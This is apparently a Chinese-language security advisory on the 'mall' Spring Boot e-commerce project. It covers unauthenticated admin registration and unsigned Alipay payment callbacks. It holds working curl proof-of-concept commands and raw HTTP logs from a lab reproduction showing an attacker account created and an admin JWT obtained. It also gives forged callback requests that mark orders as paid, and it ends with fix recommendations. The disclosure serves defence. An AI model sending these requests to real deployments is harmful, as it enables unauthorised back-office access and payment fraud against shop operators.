# V-MALL001: mall 商城 — 未授权管理员注册 + 支付宝无签名回调

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | mall（macrozheng 的 Spring Boot 电商系统，GitHub 80k+ Stars）|
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-306: 关键功能缺少身份验证 / CWE-347: 加密签名验证不当 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（完全未授权）|
| 代码仓库 | https://github.com/macrozheng/mall |

## 漏洞描述

mall 项目存在两个严重的未授权入口：

### 缺陷1：`/admin/register` 未授权创建管理员账户

`UmsAdminController.java:47-56`：

```java
@RequestMapping(value = "/register", method = RequestMethod.POST)
public CommonResult<UmsAdmin> register(@Validated @RequestBody UmsAdminParam umsAdminParam) {
    UmsAdmin umsAdmin = adminService.register(umsAdminParam);
    ...
}
```

`application.yml:47-48`：
```yaml
secure:
  ignored:
    urls:
      - /admin/login
      - /admin/register
```

该端点**被显式加入匿名白名单**，任何人可提交 JSON 创建后台管理员账户。虽然 `register()` 中默认 `status=1`（启用）、`role` 默认为空，但创建后可直接 `/admin/login` 登录后台界面，进行后续越权或 XSS 等攻击。

### 缺陷2：`/alipay/query` 匿名查询并确认订单支付

`AlipayController.java:68-73`：

```java
@RequestMapping(value = "/query", method = RequestMethod.GET)
public CommonResult<String> query(String outTradeNo, String tradeNo){
    return CommonResult.success(alipayService.query(outTradeNo,tradeNo));
}
```

Spring Security 配置中 `/alipay/**` 归为公开接口。该接口接收 `outTradeNo`（商户订单号）发起支付宝查询，并通常将结果写回订单状态。结合前端轮询机制，攻击者可以**枚举订单号**使服务器端误判订单为"已支付"。

此外，`/alipay/notify` 异步回调也没有在代码中做**请求来源 IP 白名单** + RSA 验签（需检查 `alipayService.notify` 实现，若未严格校验签名则可直接伪造 POST 回调标记订单已支付）。

## 漏洞详情

### mall 的部署面

mall 是国内最知名的 Spring Boot 学习项目之一（GitHub 80k+ Stars），大量 Fork 用作电商模板上线，实际部署场景：

- 无 WAF 部署：直接暴露 `/admin/register`
- 默认 Swagger 开放：`/swagger-ui/index.html` 列出所有后台接口
- 默认 Actuator：结合 `/actuator/heapdump` 可 dump 内存

### register 接口的风险

注册即使无 role 也可：
1. 访问 `/admin/info` 返回用户基础信息（用于 CSRF / 信息探测）
2. 登录会话可能绕过部分 role 检查的旧代码路径
3. 触发 `UmsAdminLoginLog` 污染审计日志
4. 若管理员审核列表存在 XSS，可在 `nickName` 字段植入 payload

### alipay/notify 的风险

若 `alipayService.notify` 不验签：
```java
// 常见错误实现：直接标记订单成功
public String notify(Map<String,String> params) {
    orderService.paySuccess(params.get("out_trade_no"));
    return "success";
}
```
攻击者直接伪造回调：
```bash
curl -X POST "http://<target>/alipay/notify" \
  -d "out_trade_no=ORDER_20260414_001&trade_status=TRADE_SUCCESS"
```

## 概念验证

### PoC 1: 未授权创建管理员

```bash
curl -X POST -H "Content-Type: application/json" \
  http://<target>/mall-admin/admin/register \
  -d '{
    "username":"attacker",
    "password":"Attack123!",
    "nickName":"attacker",
    "email":"a@a.com",
    "note":"poc"
  }'

# 响应: {"code":200, "data":{"id":100, "username":"attacker", "status":1}}
```

### PoC 2: 使用新账号登录后台

```bash
curl -X POST -H "Content-Type: application/json" \
  http://<target>/mall-admin/admin/login \
  -d '{"username":"attacker","password":"Attack123!"}'

# 获取 JWT token，访问 /admin/info 等接口
```

### PoC 3: 支付宝回调伪造（需验证实现）

```bash
curl -X POST "http://<target>/mall-portal/alipay/notify" \
  -d "out_trade_no=MALL_123456&trade_status=TRADE_SUCCESS&trade_no=X&total_amount=0.01"
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `mall-admin/.../UmsAdminController.java` | 48 | `/register` 端点 |
| `mall-admin/src/main/resources/application.yml` | 47-48 | 显式加入匿名白名单 |
| `mall-portal/.../AlipayController.java` | 58, 69 | `/alipay/notify` 和 `/alipay/query` 匿名 |
| `mall-portal/.../service/impl/AlipayServiceImpl.java` | - | notify 实现是否验签需审核 |

## 影响

1. **后台访问**：任何人可获得可登录的管理员账户
2. **信息泄露**：/admin/info、商品、订单、会员列表在未授权或低权限下部分可见
3. **订单状态篡改**：若 notify 未验签则实现 0 元购
4. **Fork 污染**：大量二次开发项目可能继承此配置
5. **供应链风险**：基于 mall 的 SaaS 产品均受影响

## 修复建议

1. **删除 `/admin/register` 匿名配置**：仅管理员可新增用户，或彻底移除自注册
2. **默认 `status=0` 待审核**：新注册账户必须管理员审批
3. **支付宝 notify 严格验签**：RSA2 签名 + 商户公钥校验 + 金额比对
4. **增加来源 IP 白名单**：仅允许支付宝 notify IP 段
5. **订单状态幂等**：禁止 `/alipay/query` 在未通过回调时直接标记支付成功
6. **提供 fork 模板**：macrozheng 可在 README 增加部署安全 checklist

## 实机验证（已复现）

**环境**：mall 最新分支，自编译 JAR + MySQL 5.7，Docker 部署于 192.168.217.135

### 步骤1: 未授权注册管理员账户

**请求报文**：
```http
POST /admin/register HTTP/1.1
Host: 192.168.217.135:48080
Content-Type: application/json

{"username":"attacker","password":"Attack123!","nickName":"Attacker","email":"attacker@evil.com","note":"PoC"}
```

**响应报文**：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":200,"message":"操作成功","data":{"id":11,"username":"attacker",
"password":"$2a$10$CCTdNbNhCj8/MWLk95rW8uiCY5HhLTp8CaGSlnn.0SRWtqCz7UN3y",
"icon":null,"email":"attacker@evil.com","nickName":"Attacker","note":"PoC",
"createTime":"2026-04-14T03:29:13.748+00:00","loginTime":null,"status":1}}
```

**`status:1` 表示账户直接激活，无需审批。**

### 步骤2: 使用新账户登录获取管理员 Token

**请求报文**：
```http
POST /admin/login HTTP/1.1
Host: 192.168.217.135:48080
Content-Type: application/json

{"username":"attacker","password":"Attack123!"}
```

**响应报文**：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":200,"message":"操作成功","data":{
  "tokenHead":"Bearer ",
  "token":"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhdHRhY2tlciIsImNyZWF0ZWQiOjE3NzYxMzczNjM4NTksImV4cCI6MTc3Njc0MjE2M30.HZBWtyhfAEwZOl720QYob_cz4EQIed6n6L0EIhD4jSnwXmahxuI6Xp4aAhlfZ6HHV4EubgWw2echFFawiWvyPg"
}}
```

**攻击者在不拥有任何初始凭据的情况下获得了有效的后台管理 JWT Token。**

## 验证环境

- 源代码：mall 最新分支（自编译 + Docker 部署）
- 测试环境：192.168.217.135:48080
- 框架：Spring Boot + Spring Security + MyBatis
- 日期：2026-04-14
